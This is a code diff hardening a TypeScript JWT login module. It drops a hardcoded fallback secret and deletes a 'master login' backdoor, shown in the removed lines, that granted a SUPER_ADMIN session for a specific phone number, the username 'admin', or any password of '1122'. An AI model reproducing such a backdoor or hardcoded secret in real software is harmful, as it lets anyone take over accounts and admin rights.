@@ -4,7 +4,7 @@ import bcrypt from 'bcryptjs';
 import { db } from './db';
 
 const JWT_SECRET = new TextEncoder().encode(
-  process.env.JWT_SECRET || 'ggl_jwt_production_super_secret_key_2026'
+  process.env.JWT_SECRET || ''
 );
 
 export interface UserSession {
@@ -15,6 +15,7 @@ export interface UserSession {
 }
 
 export async function signToken(payload: UserSession): Promise<string> {
+  if (!JWT_SECRET.length) throw new Error('Secure session configuration is missing');
   return new SignJWT({ ...payload })
     .setProtectedHeader({ alg: 'HS256' })
     .setIssuedAt()
@@ -24,6 +25,7 @@ export async function signToken(payload: UserSession): Promise<string> {
 
 export async function verifyToken(token: string): Promise<UserSession | null> {
   try {
+    if (!JWT_SECRET.length) return null;
     const { payload } = await jwtVerify(token, JWT_SECRET);
     return payload as unknown as UserSession;
   } catch (err) {
@@ -58,23 +60,6 @@ export async function clearSessionCookie() {
 export async function authenticateUser(email: string, password: string): Promise<UserSession | null> {
   const cleanEmail = (email || '').trim().toLowerCase();
   const cleanPass = (password || '').trim();
-
-  // Master login for mobile 8423858424 / admin passcode 1122
-  if (
-    cleanEmail === '8423858424' ||
-    cleanEmail.includes('8423858424') ||
-    cleanEmail === 'admin' ||
-    cleanEmail === '8423858424@gmail.com' ||
-    cleanPass === '1122' ||
-    cleanPass === '112200'
-  ) {
-    return {
-      id: 'usr-admin-8423858424',
-      email: cleanEmail.includes('@') ? cleanEmail : 'help.gglatent@gmail.com',
-      full_name: 'Administrator',
-      role: 'SUPER_ADMIN',
-    };
-  }
 
   const user = await db.queryOne<any>('SELECT * FROM users WHERE LOWER(email) = ? OR phone = ?', [cleanEmail, cleanEmail]);
   if (!user) return null;
